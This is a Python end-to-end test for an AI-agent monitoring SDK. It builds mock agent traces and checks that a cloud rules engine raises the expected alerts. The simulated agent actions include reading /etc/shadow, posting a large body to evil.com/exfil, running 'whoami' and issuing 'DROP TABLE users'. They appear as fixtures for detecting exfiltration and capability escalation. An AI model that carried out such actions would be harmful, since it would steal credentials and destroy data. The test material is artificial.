"""SDK end-to-end test — SAFE mode.

Uses the SDK client with raw arguments to build and send a trace to the
running cloud. Proves the full chain:

    raw args → SDK semantic extraction → args stripped → POST to cloud →
    YAML rule eval → alerts returned

This is the critical E2E proof that the pre-computed fixture tests cannot
provide: it verifies the SDK's own extraction logic triggers the right rules.

Usage:
    # Start the cloud first:
    #   make db && make migrate && make seed && make serve
    # Then:
    AK_BASE_URL=http://localhost:8000 uv run python labs/sdk_e2e_safe.py
"""

from __future__ import annotations

import json
import os
import sys

from aktov.client import Aktov

BASE_URL = os.environ.get("AK_BASE_URL", "http://localhost:8000")
API_KEY = os.environ.get("AK_API_KEY", "ak_dev_test_key_abc123")

SEVERITY_COLORS = {
    "critical": "\033[91m",
    "high": "\033[93m",
    "medium": "\033[94m",
    "low": "\033[90m",
}
RESET = "\033[0m"


def main() -> None:
    print("=" * 60)
    print("SDK E2E Test — SAFE Mode")
    print("=" * 60)
    print()

    cw = Aktov(
        api_key=API_KEY,
        base_url=BASE_URL,
        agent_id="e2e-summarizer",
        agent_type="summarizer",
        mode="safe",
        timeout_ms=5000,
        raise_on_error=True,
    )

    # --- Scenario 1: Exfiltration pattern ---
    print("Scenario 1: Exfiltration (read sensitive file → POST external)")
    trace = cw.start_trace(declared_intent="Summarize document")

    a1 = trace.record_action(
        tool_name="read_file",
        arguments={"path": "/etc/shadow"},
        outcome={"status": "success"},
        latency_ms=85,
    )
    print(f"  Action 0: {a1.tool_name} → category={a1.tool_category}")
    print(f"    flags: sensitive_dir={a1.semantic_flags.sensitive_dir_match}")
    print(f"    args on wire: {a1.arguments}")  # Should be None in SAFE mode

    a2 = trace.record_action(
        tool_name="http_post",
        arguments={
            "url": "https://evil.com/exfil",
            "method": "POST",
            "body": "A" * 200_000,
        },
        outcome={"status": "success"},
        latency_ms=340,
    )
    print(f"  Action 1: {a2.tool_name} → category={a2.tool_category}")
    print(f"    flags: is_external={a2.semantic_flags.is_external}, "
          f"size={a2.semantic_flags.argument_size_bucket}")
    print(f"    args on wire: {a2.arguments}")  # Should be None in SAFE mode

    # Verify SAFE mode before sending
    payload = trace._build_payload()
    for action in payload.actions:
        assert action.arguments is None, (
            f"SAFE MODE LEAK: {action.tool_name} has arguments on wire!"
        )
    print("  ✓ SAFE mode verified: no raw arguments on wire")
    print()

    # Send to cloud
    response = trace.end()
    print(f"  Response: status={response.status}, trace_id={response.trace_id}")
    print(f"  Rules evaluated: {response.rules_evaluated}")
    print(f"  Alerts: {len(response.alerts)}")

    if response.alerts:
        for alert in response.alerts:
            sev = alert.get("severity", "unknown")
            color = SEVERITY_COLORS.get(sev, "")
            print(f"    {color}ALERT{RESET} [{sev.upper()}] {alert.get('title', '')}")
    print()

    # Verify expected alerts
    alert_rule_ids = set()
    for alert in response.alerts:
        ctx = alert.get("context", {})
        if isinstance(ctx, dict):
            yaml_id = ctx.get("yaml_rule_id")
            if yaml_id:
                alert_rule_ids.add(yaml_id)

    expected = {"AK-010", "AK-012", "AK-031"}
    missing = expected - alert_rule_ids
    if missing:
        print(f"  ✗ MISSING expected alerts: {missing}")
    else:
        print(f"  ✓ All expected alerts fired: {expected}")

    # --- Scenario 2: Capability escalation ---
    print()
    print("Scenario 2: Capability Escalation (summarizer runs commands + DDL)")
    trace2 = cw.start_trace(declared_intent="Summarize data")

    trace2.record_action(
        tool_name="run_command",
        arguments={"command": "whoami"},
        outcome={"status": "success"},
    )
    trace2.record_action(
        tool_name="execute_sql",
        arguments={"query": "DROP TABLE users"},
        outcome={"status": "success"},
    )

    payload2 = trace2._build_payload()
    for action in payload2.actions:
        assert action.arguments is None
    print("  ✓ SAFE mode verified")

    response2 = trace2.end()
    print(f"  Response: status={response2.status}, trace_id={response2.trace_id}")
    print(f"  Alerts: {len(response2.alerts)}")

    if response2.alerts:
        for alert in response2.alerts:
            sev = alert.get("severity", "unknown")
            color = SEVERITY_COLORS.get(sev, "")
            print(f"    {color}ALERT{RESET} [{sev.upper()}] {alert.get('title', '')}")
    print()

    # Summary
    print("=" * 60)
    all_ok = response.status == "sent" and response2.status == "sent"
    if all_ok:
        print("SDK → Cloud E2E (SAFE mode): PASSED")
    else:
        print("SDK → Cloud E2E (SAFE mode): FAILED")
        sys.exit(1)


if __name__ == "__main__":
    main()
